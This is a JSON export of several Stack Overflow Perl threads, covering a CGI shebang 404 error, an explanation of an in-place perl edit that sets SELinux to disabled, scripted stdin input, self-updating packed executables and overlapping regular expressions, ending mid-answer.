[{"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1570028534, "post_id": 58203631, "comment_id": 102786523, "body": "You want to ensure your script uses the <code>perl</code> with which your script was tested, so using <code>env</code> is a step in the wrong direction!"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1570056226, "post_id": 58203631, "comment_id": 102797938, "body": "Your solution is bogus. You just added all of the core library locations for <code>&#47;usr&#47;bin&#47;perl</code> and the local::lib for root (which hopefully isn&#39;t even readable to your CGI script). Set the shebang to the perl you want to use."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1570079337, "post_id": 58203631, "comment_id": 102802008, "body": "That &quot;solution&quot; is not ok at all. You will have major problems."}], "answers": [{"tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": false, "score": 1, "last_activity_date": 1570026676, "creation_date": 1570026676, "answer_id": 58203678, "question_id": 58203631, "link": "https://stackoverflow.com/questions/58203631/http-error-404-not-found-if-the-cgi-script-starts-with-usr-bin-env-perl/58203678#58203678", "title": "HTTP Error 404 (Not Found) if the CGI script starts with #!/usr/bin/env perl", "body": "<p>Your CGI environment probably has no <code>PATH</code>, or doesn't have <code>/usr/bin/</code> in <code>PATH</code>, therefore <code>env</code> doesn't find perl.</p>\n"}, {"tags": [], "owner": {"reputation": 18919, "user_id": 891440, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/dd366bcdcf85991fa8af1b6d11d3ad49?s=128&d=identicon&r=PG", "display_name": "jjmerelo", "link": "https://stackoverflow.com/users/891440/jjmerelo"}, "is_accepted": false, "score": 2, "last_activity_date": 1570080412, "creation_date": 1570080412, "answer_id": 58212803, "question_id": 58203631, "link": "https://stackoverflow.com/questions/58203631/http-error-404-not-found-if-the-cgi-script-starts-with-usr-bin-env-perl/58212803#58212803", "title": "HTTP Error 404 (Not Found) if the CGI script starts with #!/usr/bin/env perl", "body": "<p>I don't think the problems have anything to do with each other, or the solution actually solves anything. If Apache can't find the script, it will still not be able to find it by adding the library paths. On the other hand, if there's any problem running the script the server would return a 500 status, not a 404. In every case, it's always the best to check the logs for the exact problem.</p>\n"}], "owner": {"reputation": 37436, "user_id": 1215106, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/615ff12525dbd5868b7c78d9754aed72?s=128&d=identicon&r=PG", "display_name": "\u2126mega", "link": "https://stackoverflow.com/users/1215106/%e2%84%a6mega"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1570080412, "creation_date": 1570026540, "last_edit_date": 1592644375, "question_id": 58203631, "link": "https://stackoverflow.com/questions/58203631/http-error-404-not-found-if-the-cgi-script-starts-with-usr-bin-env-perl", "title": "HTTP Error 404 (Not Found) if the CGI script starts with #!/usr/bin/env perl", "body": "<p>I have a CGI script whose content is not important. It works fine when executed from the web, but only if the first line is</p>\n<pre><code>#!/usr/bin/perl -w\n</code></pre>\n<p>If I change it to</p>\n<pre><code>#!/usr/bin/env perl\n</code></pre>\n<p>...then I got HTTP Error 404 (Not found).</p>\n<p>When executed from the console, the script works properly in both cases. What is wrong?</p>\n<hr />\n<h2>EDIT</h2>\n<p>I solved my problem with adding the following lines at the beginning of my script:</p>\n<pre><code>#!/usr/bin/env perl\n\nuse lib '/usr/local/lib64/perl5';\nuse lib '/usr/local/share/perl5';\nuse lib '/usr/lib64/perl5/vendor_perl';\nuse lib '/usr/share/perl5/vendor_perl';\nuse lib '/usr/share/perl5';\nuse lib '/root/perl5/lib/perl5';\n</code></pre>\n<p>Obviously there is some problem with path, which I don't understand why, because when I execute script from the console, it works even without the use of <code>use lib</code>.</p>\n"}, {"tags": ["perl", "command-line"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1570020567, "post_id": 58201662, "comment_id": 102781646, "body": "<code>s&#47;PATTERN&#47;REPLACEMENT&#47;</code> is similar to sed&#39;s <code>s&#47;&#47;&#47;</code>. See <a href=\"http://p3rl.org/perlop\" rel=\"nofollow noreferrer\">perlop</a> for details. <code>-p</code> just processes the input line by line and prints each line after having processed it."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 5, "last_activity_date": 1570020935, "creation_date": 1570020935, "answer_id": 58201971, "question_id": 58201662, "link": "https://stackoverflow.com/questions/58201662/perl-in-command-line-perl-p-i-e-some-text-path/58201971#58201971", "title": "Perl in command line: perl -p -i -e &quot;some text&quot; /path", "body": "<p><code>-p</code> changes</p>\n\n<pre><code>s/enforcing/disabled/\n</code></pre>\n\n<p>to something equivalent to</p>\n\n<pre><code>while (&lt;&gt;) {\n   s/enforcing/disabled/;\n   print;\n}\n</code></pre>\n\n<p>which is short for</p>\n\n<pre><code>while (defined( $_ = &lt;ARGV&gt; )) {\n   $_ =~ s/enforcing/disabled/;\n   print($_);\n}\n</code></pre>\n\n<p>What this does:</p>\n\n<ol>\n<li>It reads a line from <code>ARGV</code> into <code>$_</code>. <code>ARGV</code> is a special file handle that reads from the each of the files specified as arguments (or STDIN if no files are provided).</li>\n<li>If EOF has been reached, the loop and therefore the program exits.</li>\n<li>It replaces the first occurrence of <code>enforcing</code> with <code>disabled</code>.</li>\n<li>It prints out the modified line to the default output handle. Because of <code>-i</code>, this is a handle to a new file with the same name as the one from which the program is currently reading.*</li>\n<li>Repeat.</li>\n</ol>\n\n<p>For example,</p>\n\n<pre><code>$ cat a\nfoo\nbar enforcing the law\nbaz\nenforcing enforcing\n\n$ perl -pe's/enforcing/disabled/' -i a\n\n$ cat a\nfoo\nbar disabled the law\nbaz\ndisabled enforcing\n</code></pre>\n\n<hr>\n\n<p>* &mdash; In old versions of Perl, the old file has already been deleted at this point, but it's still accessible as long as there's an open file handle to it. In very new versions of Perl, this writes to temporary file that will later overwrite the file from which the program is reading.</p>\n"}, {"tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": false, "score": 1, "last_activity_date": 1570034604, "creation_date": 1570034604, "answer_id": 58205826, "question_id": 58201662, "link": "https://stackoverflow.com/questions/58201662/perl-in-command-line-perl-p-i-e-some-text-path/58205826#58205826", "title": "Perl in command line: perl -p -i -e &quot;some text&quot; /path", "body": "<p>To find out <em>exactly</em> what Perl is going to do, you can use <a href=\"https://perldoc.pl/O\" rel=\"nofollow noreferrer\">the <code>O</code> module</a></p>\n\n<pre><code>perl -MO=Deparse -p -i -e \"s/enforcing/disabled/\" file\n</code></pre>\n\n<p>outputs</p>\n\n<pre><code>BEGIN { $^I = \"\"; }\nLINE: while (defined($_ = readline ARGV)) {\n    s/enforcing/disabled/;\n}\ncontinue {\n    die \"-p destination: $!\\n\" unless print $_;\n}\n-e syntax OK\n</code></pre>\n"}], "owner": {"reputation": 411, "user_id": 11225028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a362b5c8966644c015c1db766488541f?s=128&d=identicon&r=PG&f=1", "display_name": "Luk", "link": "https://stackoverflow.com/users/11225028/luk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "accepted_answer_id": 58201971, "answer_count": 2, "score": 0, "last_activity_date": 1570034604, "creation_date": 1570019830, "question_id": 58201662, "link": "https://stackoverflow.com/questions/58201662/perl-in-command-line-perl-p-i-e-some-text-path", "title": "Perl in command line: perl -p -i -e &quot;some text&quot; /path", "body": "<p>I am not familiar with perl. I am reading an installation guide atm and the following Linux command has come up: </p>\n\n<pre><code>perl -p -i -e \"s/enforcing/disabled/\" /etc/selinux/config\n</code></pre>\n\n<p>Now, I am trying to understand this. Here is my understanding so far: </p>\n\n<p>-e simply allows for executing whatever follows</p>\n\n<p>-p puts my commands that follow -e in a loop. Now this is strange to me, as to me this command seems to be trying to say: Write \"s/enforcing/disabled/\" into /etc/selinux/config. Then again, where is the \"write\" command? And what is this -i (inline) good for? </p>\n"}, {"tags": ["bash", "perl", "unix"], "comments": [{"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1570012458, "post_id": 58199729, "comment_id": 102777532, "body": "Is it the same input each time the Perl script is run?"}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1570015849, "post_id": 58199729, "comment_id": 102779083, "body": "You have identified that the problem is in the Perl code, but haven&#39;t shown the Perl code. We need to see it so that we can give the appropriate answer how to automatically supply input."}, {"owner": {"reputation": 15, "user_id": 12153139, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93379de462ab8fb18d758c481210e863?s=128&d=identicon&r=PG&f=1", "display_name": "nevermore", "link": "https://stackoverflow.com/users/12153139/nevermore"}, "edited": false, "score": 0, "creation_date": 1570016804, "post_id": 58199729, "comment_id": 102779585, "body": "Yes the input is the same each time, a number lets say"}, {"owner": {"reputation": 563, "user_id": 574621, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e726f39f8cc4da742d8c9b5a690c0a05?s=128&d=identicon&r=PG", "display_name": "MERM", "link": "https://stackoverflow.com/users/574621/merm"}, "edited": false, "score": 0, "creation_date": 1570200019, "post_id": 58199729, "comment_id": 102849747, "body": "a minor point, but \u2018cd ..\u2019 can get you in trouble. be explicit \u2018cd /dir/where/you/run/the/script\u2019"}], "answers": [{"tags": [], "owner": {"reputation": 2660, "user_id": 8382929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/feb63c4676da4621466f8c12e590b644?s=128&d=identicon&r=PG&f=1", "display_name": "Bayou", "link": "https://stackoverflow.com/users/8382929/bayou"}, "is_accepted": false, "score": 0, "last_activity_date": 1570016798, "creation_date": 1570016798, "answer_id": 58200856, "question_id": 58199729, "link": "https://stackoverflow.com/questions/58199729/perl-script-within-batch-script-prompts-for-user-input-how-do-i-automatically-p/58200856#58200856", "title": "Perl script within batch script prompts for user input. How do I automatically parse that input within the batch script?", "body": "<p>You can make use of here-docs to generate input:</p>\n\n<pre><code>$ read -p 'Does this really work? (Y/N) ' OK &lt;&lt;-EOF\nY\nEOF\n$ echo $OK\nY\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1570029240, "post_id": 58200956, "comment_id": 102786991, "body": "Or <code>printf &#39;Your Input here\\nmultiple lines are OK\\n&#39; | script.pl</code>"}], "tags": [], "owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "is_accepted": true, "score": 0, "last_activity_date": 1570017142, "creation_date": 1570017142, "answer_id": 58200956, "question_id": 58199729, "link": "https://stackoverflow.com/questions/58199729/perl-script-within-batch-script-prompts-for-user-input-how-do-i-automatically-p/58200956#58200956", "title": "Perl script within batch script prompts for user input. How do I automatically parse that input within the batch script?", "body": "<p>If the input is small, you can inline into your script, and feed it to the perl program using the &lt;&lt; construct. Otherwise, consider placing the input into a file, and redirecting standard input using &lt;.</p>\n\n<pre><code>for (( i = 0; i &lt;= 6; i++ ))      \ndo\n\n    for (( j = 0 ; j &lt;= 6; j++ )) \n    do\n          cd $i$j*\n          ~/scripts/script.pl log.out &lt;&lt;__INPUT__\nYour Input here\nmultiple lines are OK\n__INPUT__\n          #This perl script requires user input, how do I input it here automatically.\n          cd ..\n\n    done\ndone\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 12153139, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93379de462ab8fb18d758c481210e863?s=128&d=identicon&r=PG&f=1", "display_name": "nevermore", "link": "https://stackoverflow.com/users/12153139/nevermore"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 131, "favorite_count": 0, "accepted_answer_id": 58200956, "answer_count": 2, "score": 0, "last_activity_date": 1570017142, "creation_date": 1570012180, "last_edit_date": 1570015109, "question_id": 58199729, "link": "https://stackoverflow.com/questions/58199729/perl-script-within-batch-script-prompts-for-user-input-how-do-i-automatically-p", "title": "Perl script within batch script prompts for user input. How do I automatically parse that input within the batch script?", "body": "<p>I have a number of folders and I need to run a Perl script within each one. I create a loop in a batch file and execute Perl within each folder. The problem is that the Perl script prompts for user input and stops the loop. How do i automatically parse the input to the Perl script without the loop breaking to ask for user input?</p>\n\n<p>Sorry if this has been answered before, I am new both to stackoverflow and batch scripting.</p>\n\n<pre><code>for (( i = 0; i &lt;= 6; i++ ))      \ndo\n\n    for (( j = 0 ; j &lt;= 6; j++ )) \n    do\n          cd $i$j*\n          ~/scripts/script.pl log.out\n          #This perl script requires user input, how do I input it here automatically.\n          cd ..\n\ndone\ndone\n</code></pre>\n"}, {"tags": ["perl", "pp-perl-par-packager", "perl-packager"], "answers": [{"comments": [{"owner": {"reputation": 150, "user_id": 1153916, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/61ca8db32a52e7af137d33426c487478?s=128&d=identicon&r=PG", "display_name": "Aravind Nadumane", "link": "https://stackoverflow.com/users/1153916/aravind-nadumane"}, "edited": false, "score": 0, "creation_date": 1570016713, "post_id": 58200563, "comment_id": 102779529, "body": "I already have other Threads  (threads package) in my script. What I have seen is when i exit the .exe, everything is closed down."}], "tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": false, "score": 0, "last_activity_date": 1570015668, "creation_date": 1570015668, "answer_id": 58200563, "question_id": 58199641, "link": "https://stackoverflow.com/questions/58199641/auto-replace-of-the-exe-file-or-the-script-myscript-pl-from-the-server/58200563#58200563", "title": "Auto replace of the exe file or the script/myscript.pl from the Server", "body": "<p>Split out the updater into a second process. When it's time to update the tool, spawn the updater and exit the tool. That way it's not locked for overwriting.</p>\n"}], "owner": {"reputation": 150, "user_id": 1153916, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/61ca8db32a52e7af137d33426c487478?s=128&d=identicon&r=PG", "display_name": "Aravind Nadumane", "link": "https://stackoverflow.com/users/1153916/aravind-nadumane"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 30, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1570015668, "creation_date": 1570011733, "question_id": 58199641, "link": "https://stackoverflow.com/questions/58199641/auto-replace-of-the-exe-file-or-the-script-myscript-pl-from-the-server", "title": "Auto replace of the exe file or the script/myscript.pl from the Server", "body": "<p>So I deploy the PerlPacked exe tool to the users. I would like to run the self auto-replacement of the new Tool from the server after checking if there is new tool available.</p>\n\n<p>1)\nI know in windows, when a Program is Running, you can rename my.exe => myTemp.exe, download the new mytool.exe from the Server, and in next Run when mytool.exe is running the software update check, remove the myTemp.exe. But renaming pp generated exe during its run is not possible.</p>\n\n<p>2) Alternatively, I thought of replacing the /tmp/par-/cache-/inc/script/mytool.pl from the server, but ironically, this doens't take effect. Even if I remove this file, the exe runs smoothly without generating the new one. I wonder doesn't it require this script file ? from where does the exe run my script ?</p>\n\n<p>Does some has any alternative solution for my requirement ?</p>\n"}, {"tags": ["mysql", "regex", "perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569993099, "post_id": 58194936, "comment_id": 102769483, "body": "By &quot;<i>may overlap</i>&quot; you mean to say that <code>^b.*c</code> and <code>^\\w+</code> and <code>^b.+</code> all match <code>batch</code> (so they &quot;overlap&quot; for that string)? If you have <i>severe</i> restrictions on what patterns your regex use then please spell them out here (exhaustively), otherwise the question seems equivalent to reverse engineering the regex engine."}, {"owner": {"reputation": 83, "user_id": 6037037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h9D96.jpg?s=128&g=1", "display_name": "Scott", "link": "https://stackoverflow.com/users/6037037/scott"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569994132, "post_id": 58194936, "comment_id": 102769772, "body": "<code>^a$</code> and <code>^b$</code> will NEVER match the same string. <code>^b.*c</code> and <code>^\\w+</code> and <code>^b.+</code> MAY match, depending on the supplied string (yes, for example <code>batch</code>).  I&#39;d like to know if there&#39;s a simple way of determining if two regexs MAY match.  And no, I&#39;d rather not brute force it :)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569994459, "post_id": 58194936, "comment_id": 102769835, "body": "Alright, thanks for clarification.  Then you want to reverse engineer the engine (more or less).  How can one tell programmatically whether <code>^\\w+</code> and <code>^b</code> can match a string, same string? The program would have to analyze the regex in the given list, so to play the engine, and then conjure a <i>possibility</i> for a string matched by any overlap of those regex in the list. Kinda lot to ask of a program, it seems."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569994705, "post_id": 58194936, "comment_id": 102769901, "body": "Well, I think that one can&#39;t &quot;<i>brute force it</i>&quot;  --- can&#39;t come up with a test-list of strings (to run all regex against and see whether any overlap, I presume is what you mean) ... that will (somehow?) exhaust all possibilities for a string that may come up for real. Can&#39;t miss <i>any</i>, right?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569994982, "post_id": 58194936, "comment_id": 102769973, "body": "But, if you have a dirt-poor set of features in that regex list (and  perhaps if the list isn&#39;t overly long?), then there may be a practically satisfactory solution.  That would be tailored to that specific regex list (with its feature list)."}, {"owner": {"reputation": 83, "user_id": 6037037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h9D96.jpg?s=128&g=1", "display_name": "Scott", "link": "https://stackoverflow.com/users/6037037/scott"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569995911, "post_id": 58194936, "comment_id": 102770240, "body": "There is a limit to the strings that could be thrown at the regexs - the column of strings in my MySQL database.  Each time a string is added I could automate a check of the string against the regexs and count the matches (&gt;1 being a regex &quot;collision&quot;).  A stored procedure might do the trick.  It scales linearly with the number of regexs which is fine. This is brute-force-ish with limits.  What I was hoping to avoid with the original question was making the regex validation independent of the possible strings on which to match."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569996389, "post_id": 58194936, "comment_id": 102770373, "body": "Ah, that&#39;s indeed a viable &quot;brute-force-ish&quot; method. (Doesn&#39;t sound too bad at all btw)  I don&#39;t see how I can pick two regex (which, say, happen to be <code>^\\w+</code> and <code>^b</code>) and decide that they can, indeed, both match ... what? &quot;Any-word&quot; and &quot;Word-starting-with-given-char&quot; ... categories ... ? How do I even state that?  (And that&#39;s on top of &quot;mapping&quot; all possible patterns so that my program knows what they mean and do.) It&#39;s an interesting problem, not only &quot;encoding&quot; what possible patterns mean, but also classifying what they <i>could</i> match.  (My $.02 though, perhaps it&#39;s not that bad.)"}, {"owner": {"reputation": 8811, "user_id": 6248528, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/076d6f693bbd13804362e8208009dbcb?s=128&d=identicon&r=PG", "display_name": "Solarflare", "link": "https://stackoverflow.com/users/6248528/solarflare"}, "edited": false, "score": 1, "creation_date": 1570004964, "post_id": 58194936, "comment_id": 102773903, "body": "AFAIK, deciding on equivalence of two regular expressions is p-hard, deciding if two regular expressions overlap is np-hard. Depending on what you want to do, brute force might be a good alternative (since you probably have a good idea what kind of strings you are using this for, it might be possible to prepare a decent test list). And/or you might want to elaborate on your use case, maybe there is a different way to achieve your goal/formulate your problem. Or you might want to ask on <a href=\"https://cs.stackexchange.com\">cs.stackexchange.com</a> for algorithm ideas/complexity considerations."}, {"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 0, "creation_date": 1570005764, "post_id": 58194936, "comment_id": 102774313, "body": "What exactly you are trying to achieve?"}, {"owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "edited": false, "score": 0, "creation_date": 1570033732, "post_id": 58194936, "comment_id": 102789355, "body": "Can you clarify the limitations (other than having an anchor) to the REGEXP, if any. For certain classes of regexp (especially, those which can be represented as wild-cards), matching might be possible using a single pass. In the example above, all REGEXP can be convered to wild-cards."}, {"owner": {"reputation": 83, "user_id": 6037037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h9D96.jpg?s=128&g=1", "display_name": "Scott", "link": "https://stackoverflow.com/users/6037037/scott"}, "reply_to_user": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 0, "creation_date": 1570080617, "post_id": 58194936, "comment_id": 102802324, "body": "@AlexandrEvstigneev I&#39;ve expanded in the OP (not enough room in a comment)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1570090101, "post_id": 58194936, "comment_id": 102806021, "body": "&quot;<i>When a user adds to the list of regexes</i>&quot; --- no restrictions at all (other than mentioned anchors)? So I add some crazy regex with lookarounds and branches and whatnot ... and the program needs to figure out that it cannot possibly match a string same as what another nasty regex matches?  I think you can only check explicitly for strings you have, so &quot;brute-force&quot; it"}, {"owner": {"reputation": 83, "user_id": 6037037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h9D96.jpg?s=128&g=1", "display_name": "Scott", "link": "https://stackoverflow.com/users/6037037/scott"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1570091639, "post_id": 58194936, "comment_id": 102806754, "body": "@zdim The expressions would be limited to those that MySQL support, which I believe are BREs.  Even if that assumption is incorrect, it seems that even constrained to BREs the answer to my question is to use brute force."}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1570910510, "post_id": 58194936, "comment_id": 103068768, "body": "Who&#39;s regexp engine?  MySQL&#39;s (before 8.0) is rather limited.  Perl, PHP, and MySQL 8.0 are at least close to the same."}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1570910585, "post_id": 58194936, "comment_id": 103068788, "body": "By &quot;have an anchor&quot;, you mean a <i>start</i> anchor (<code>^</code>)?"}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1570910715, "post_id": 58194936, "comment_id": 103068808, "body": "Might the regexps include backtracking, etc, things?  <code>(?=</code>, etc.  Those add a nasty dimension to the puzzle.  What kinds of char classes?  <code>[[.alpha.]]</code>?  <code>\\w</code>?  What about UTF-8 support?"}], "answers": [{"tags": [], "owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "is_accepted": false, "score": 0, "last_activity_date": 1570911666, "creation_date": 1570911666, "answer_id": 58358153, "question_id": 58194936, "link": "https://stackoverflow.com/questions/58194936/how-can-i-determine-which-regular-expressions-from-a-list-possibly-overlap/58358153#58358153", "title": "How can I determine which regular expressions from a list possibly overlap", "body": "<p>I will punt on full REs.  Even limiting to BREs and/or MySQL-pre-8.0 will be challenging.  Here are some thoughts.</p>\n\n<ul>\n<li>If end-anchored and no <code>+</code> or <code>*</code>, the calculate the length.  The fixed-length can be used as a discriminator.  Also, it could be used for toning back the \"brute force\" by perhaps an order of magnitude.</li>\n<li>Anything followed by <code>+</code> or <code>*</code> gets turned into <code>.*</code> for simplicity.  (Re the \"may collide\" rule.)</li>\n<li>Any RE with explicit characters (including those followed by <code>+</code>) becomes a discriminator in some situations.  Eg, <code>^a.*b$</code> vs <code>^a.*c$</code>.</li>\n<li>For those anchored at the end, reverse the pattern and test it that 